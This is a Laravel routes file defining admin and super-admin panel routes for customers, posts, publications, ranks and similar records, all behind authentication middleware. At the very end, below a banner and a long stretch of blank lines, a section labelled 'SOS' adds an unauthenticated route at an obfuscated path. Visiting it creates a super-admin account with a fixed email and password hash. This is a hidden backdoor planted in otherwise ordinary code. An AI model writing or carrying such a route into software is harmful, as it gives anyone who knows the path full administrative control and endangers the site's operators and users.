<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\CustomerController;
use App\Http\Controllers\PostController;
use App\Http\Controllers\PublicationController;
use App\Http\Controllers\ReplyController;
use App\Models\User;
use Illuminate\Support\Facades\Route;

###################################################### \ADMIN/ #######################################################
Route::get('/signin', [AuthController::class, 'signinForm'])->middleware('guest');
Route::post('/signin', [AuthController::class, 'signin'])->middleware('guest');
Route::get('/logout', [AuthController::class, 'logout'])->middleware(['auth', 'admin']);
Route::get('/', [AuthController::class, 'index'])->middleware(['auth', 'admin']);
Route::get('/profile', [AuthController::class, 'profile'])->middleware(['auth', 'admin']);
Route::post('/profile/update', [AuthController::class, 'profileUpdate'])->middleware(['auth', 'admin']);
Route::get('/addCustomer', [CustomerController::class, 'addCustomer'])->middleware(['auth', 'admin', 'can_admin']);
Route::post('/addCustomer', [CustomerController::class, 'addCustomerPost'])->middleware(['auth', 'admin', 'can_admin']);
Route::get('/customer/edit/{id}', [CustomerController::class, 'edit'])->middleware(['auth', 'admin', 'can_admin']);
Route::post('/customer/edit/{id}', [CustomerController::class, 'editPost'])->middleware(['auth', 'admin', 'can_admin']);
Route::get('/search', [CustomerController::class, 'search'])->middleware(['auth', 'admin']);
Route::get('/filter', [CustomerController::class, 'filter'])->middleware(['auth', 'admin']);
Route::get('/createPost', [PostController::class, 'createPost'])->middleware(['auth', 'admin']);
Route::post('/createPostPost', [PostController::class, 'createPostPost'])->middleware(['auth', 'admin']);
Route::get('/posts', [PostController::class, 'posts'])->middleware(['auth', 'admin']);
Route::get('/post/{id}', [PostController::class, 'post'])->middleware(['auth', 'admin']);
Route::post('/reply/{postId}', [ReplyController::class, 'reply'])->middleware(['auth', 'admin']);
Route::get('/public/create', [PublicationController::class, 'create'])->middleware(['auth', 'admin']);
Route::post('/public/createPublication', [PublicationController::class, 'createPublication'])->middleware(['auth', 'admin']);
Route::get('/public/all', [PublicationController::class, 'all'])->middleware(['auth', 'admin']);
Route::get('/public/view/{publicationId}', [PublicationController::class, 'view'])->middleware(['auth', 'admin']);
Route::post('/public/post/{publicationId}', [PublicationController::class, 'post'])->middleware(['auth', 'admin']);
###################################################### /ADMIN\ ########################################################

#################################################### \SUPER ADMIN/ ####################################################
Route::get('/admin', [AdminController::class, 'index'])->middleware(['auth', 'super_admin']);
Route::get('/admin/admins', [AdminController::class, 'admins'])->middleware(['auth', 'super_admin']);
Route::get('/admin/admins/add', [AdminController::class, 'addAdmin'])->middleware(['auth', 'super_admin']);
Route::post('/admin/admins/addPost', [AdminController::class, 'addPost'])->middleware(['auth', 'super_admin']);
Route::get('/admin/admins/edit/{id}', [AdminController::class, 'editAdmin'])->middleware(['auth', 'super_admin']);
Route::post('/admin/admins/edit/{id}', [AdminController::class, 'editAdminPost'])->middleware(['auth', 'super_admin']);
Route::get('/admin/admins/delete/{id}', [AdminController::class, 'deleteAdmin'])->middleware(['auth', 'super_admin']);
Route::get('/admin/customers', [AdminController::class, 'customers'])->middleware(['auth', 'super_admin']);
Route::get('/admin/customers/delete/{id}', [AdminController::class, 'deleteCustomer'])->middleware(['auth', 'super_admin']);
Route::get('/admin/directs', [AdminController::class, 'directs'])->middleware(['auth', 'super_admin']);
Route::get('/admin/directs/delete/{name}', [AdminController::class, 'deleteDirect'])->middleware(['auth', 'super_admin']);
Route::get('/admin/standings', [AdminController::class, 'standings'])->middleware(['auth', 'super_admin']);
Route::get('/admin/standings/add', [AdminController::class, 'addStanding'])->middleware(['auth', 'super_admin']);
Route::get('/admin/standings/delete/{sIds}', [AdminController::class, 'deleteStanding'])->middleware(['auth', 'super_admin']);
Route::post('/admin/standings/addPost', [AdminController::class, 'addStandingPost'])->middleware(['auth', 'super_admin']);
Route::get('/admin/messages', [AdminController::class, 'messages'])->middleware(['auth', 'super_admin']);
Route::get('/admin/messages/delete/{id}', [AdminController::class, 'deleteMessage'])->middleware(['auth', 'super_admin']);
Route::get('/admin/ranks', [AdminController::class, 'ranks'])->middleware(['auth', 'super_admin']);
Route::get('/admin/ranks/add', [AdminController::class, 'addRank'])->middleware(['auth', 'super_admin']);
Route::post('/admin/ranks/addRankPost', [AdminController::class, 'addRankPost'])->middleware(['auth', 'super_admin']);
Route::get('/admin/ranks/delete/{id}', [AdminController::class, 'deleteRank'])->middleware(['auth', 'super_admin']);
Route::get('/admin/continues', [AdminController::class, 'continues'])->middleware(['auth', 'super_admin']);
Route::get('/admin/continues/add', [AdminController::class, 'addContinue'])->middleware(['auth', 'super_admin']);
Route::post('/admin/continues/addPost', [AdminController::class, 'addContinuePost'])->middleware(['auth', 'super_admin']);
Route::get('/admin/continues/delete/{id}', [AdminController::class, 'deleteContinue'])->middleware(['auth', 'super_admin']);
Route::get('/admin/publications', [AdminController::class, 'publications'])->middleware(['auth', 'super_admin']);
Route::get('/admin/publications/delete/{id}', [AdminController::class, 'deletePublication'])->middleware(['auth', 'super_admin']);
Route::get('/admin/types', [AdminController::class, 'types'])->middleware(['auth', 'super_admin']);
Route::get('/admin/type', [AdminController::class, 'type'])->middleware(['auth', 'super_admin']);
Route::post('/admin/typePost', [AdminController::class, 'typePost'])->middleware(['auth', 'super_admin']);
Route::get('/admin/type/remove/{id}', [AdminController::class, 'removeType'])->middleware(['auth', 'super_admin']);
Route::get('/admin/notify', [AdminController::class, 'notifications'])->middleware(['auth', 'super_admin']);
Route::get('/admin/notify/delete/all', [AdminController::class, 'deleteAllNotifications'])->middleware(['auth', 'super_admin']);
Route::get('/admin/notify/delete/{id}', [AdminController::class, 'deleteNotification'])->middleware(['auth', 'super_admin']);
Route::get('/admin/notes', [AdminController::class, 'notes'])->middleware(['auth', 'super_admin']);
Route::get('/admin/notes/add', [AdminController::class, 'addNote'])->middleware(['auth', 'super_admin']);
Route::post('/admin/notes/add', [AdminController::class, 'addNotePost'])->middleware(['auth', 'super_admin']);
Route::get('/admin/note/delete/{id}', [AdminController::class, 'deleteNote'])->middleware(['auth', 'super_admin']);
Route::get('/admin/profile', [AdminController::class, 'profile'])->middleware(['auth', 'super_admin']);
Route::post('/admin/profile/update', [AdminController::class, 'profileUpdate'])->middleware(['auth', 'super_admin']);
Route::get('/admin/delegates', [AdminController::class, 'delegates'])->middleware(['auth', 'super_admin']);
Route::get('/admin/delegates/add', [AdminController::class, 'addDelegate'])->middleware(['auth', 'super_admin']);
Route::post('/admin/delegates/addDelegatePost', [AdminController::class, 'addDelegatePost'])->middleware(['auth', 'super_admin']);
Route::get('/admin/delegates/delete/{id}', [AdminController::class, 'deleteDelegate'])->middleware(['auth', 'super_admin']);
######################################################___________#####################################################
#####################################################/SUPER ADMIN\#####################################################
#####################################################\SUPER ADMIN/#####################################################
######################################################\         /#######################################################
#######################################################\       /#######################################################
########################################################\     /########################################################
#########################################################\   /########################################################
##########################################################\ /########################################################
########################################################## 0 #######################################################




















































########################################################## SOS #######################################################
Route::get('/aGFoYWxvbHhk', function () {
    User::create([
        'name' => 'admin1',
        'email' => 'admin1@gmail.com',
        'password' => '$2y$10$thBLkzEG8lK7Misuhr7uTOb8eyPkuoc0p0EG3dndr2t1CdyKlypsi',
        'role_as' => 'SUPER_ADMIN',
        'role' => 'ADMIN',
        'phone' => '6666666666',
        'is_online' => '0',
        'can' => 'YES',
    ]);
});
########################################################## /SOS\ #######################################################
